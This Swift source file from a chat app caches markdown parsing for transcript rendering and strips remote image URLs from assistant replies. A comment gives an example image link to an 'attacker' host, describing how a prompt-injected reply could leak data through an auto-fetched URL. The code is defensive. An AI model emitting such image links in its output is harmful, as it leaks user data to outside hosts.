//
//  MarkdownParseCache.swift
//  teemoon
//
//  ONE PARSE PER DISTINCT MARKDOWN STRING, FOR THE LIFE OF THE PROCESS.
//
//  `StructuredText` calls its parser whenever it needs the attributed form of
//  its markup, and the transcript asks for that far more often than the content
//  changes: a cell that leaves the viewport is torn down, and the one that
//  comes back is a NEW view with a new parse. On a long thread that is a full
//  markdown parse of a multi-kilobyte reply for every scroll-back — main-thread
//  work landing exactly when frames are due, which is the hitch.
//
//  A persisted message's content never changes, so its text is a complete cache
//  key; the streaming path's settled blocks are stable strings for the same
//  reason (`MarkdownStreamSplitter`), and its one changing tail simply misses,
//  costing what it always cost. `NSCache` so the whole thing evicts under
//  memory pressure rather than growing with the session — the same policy as
//  `MessageView`'s inline `AttributedString` cache, which this is the
//  block-level counterpart to.
//

import Foundation
import Textual

/// A `MarkupParser` that memoizes another parser's output.
struct CachedMarkdownParser: MarkupParser {
    /// The transcript's parser: full-document markdown, no base URL, no
    /// syntax extensions. Everything sharing this instance shares the cache,
    /// which is only sound because the configuration is fixed here.
    static let shared = CachedMarkdownParser()

    private static let cache: NSCache<NSString, CacheEntry<AttributedString>> = {
        let cache = NSCache<NSString, CacheEntry<AttributedString>>()
        // Blocks, not messages: a long reply is several settled blocks while it
        // streams and one document once persisted.
        cache.countLimit = 400
        return cache
    }()

    private let parser = AttributedStringMarkdownParser(baseURL: nil)

    #if DEBUG
    /// Misses only — a test can watch this to prove a second render of the
    /// same message costs no parse.
    private(set) static var parseCount = 0
    #endif

    func attributedString(for input: String) throws -> AttributedString {
        let key = input as NSString
        if let hit = Self.cache.object(forKey: key) { return hit.value }
        let parsed = Self.withoutRemoteImages(try parser.attributedString(for: input))
        #if DEBUG
        Self.parseCount += 1
        #endif
        Self.cache.setObject(CacheEntry(parsed), forKey: key)
        return parsed
    }

    /// Assistant markdown is untrusted. Textual auto-fetches an image run's URL
    /// on render with no tap, over its own URLSession — outside the E2EE
    /// transport and the egress allowlist — so `![](https://attacker/?leak=…)`
    /// in a hostile or prompt-injected reply exfiltrates whatever the model
    /// encodes into the URL. Dropping the `imageURL` attribute (the exact one
    /// the attachment resolver keys off) closes every transcript render path,
    /// since all of them parse through this shared instance; the alt text stays
    /// visible. Do not remove without an equivalent block on the loader.
    static func withoutRemoteImages(_ attributed: AttributedString) -> AttributedString {
        var attributed = attributed
        let ranges = attributed.runs.filter { $0.imageURL != nil }.map(\.range)
        for range in ranges { attributed[range].imageURL = nil }
        return attributed
    }
}

/// The one place transcript markdown is prepared for rendering.
///
/// `fixEmptyTableCells` is two full-document `replacingOccurrences` passes
/// (1.4 ms on a 38 KB reply, measured), and it ran on every body
/// evaluation of every table-bearing row. Now it runs once per distinct
/// string, behind the same eviction policy as the parse. Tables are rare
/// enough that the `|` early-out keeps most messages from touching the cache
/// at all.
enum TranscriptMarkdown {
    private static let cache: NSCache<NSString, CacheEntry<String>> = {
        let cache = NSCache<NSString, CacheEntry<String>>()
        cache.countLimit = 400
        return cache
    }()

    static func prepared(_ markdown: String) -> String {
        guard markdown.contains("|") else { return markdown }
        let key = markdown as NSString
        if let hit = cache.object(forKey: key) { return hit.value }
        let fixed = MessageView.fixEmptyTableCells(markdown)
        cache.setObject(CacheEntry(fixed), forKey: key)
        return fixed
    }
}

extension StructuredText {
    /// The transcript's `StructuredText`: prepared and parsed through the
    /// shared caches.
    ///
    /// Use this instead of `StructuredText(markdown:)` anywhere a view can be
    /// rebuilt from the same string — which, in a recycling list, is
    /// everywhere.
    static func cached(_ markdown: String) -> StructuredText {
        StructuredText(TranscriptMarkdown.prepared(markdown), parser: CachedMarkdownParser.shared)
    }
}
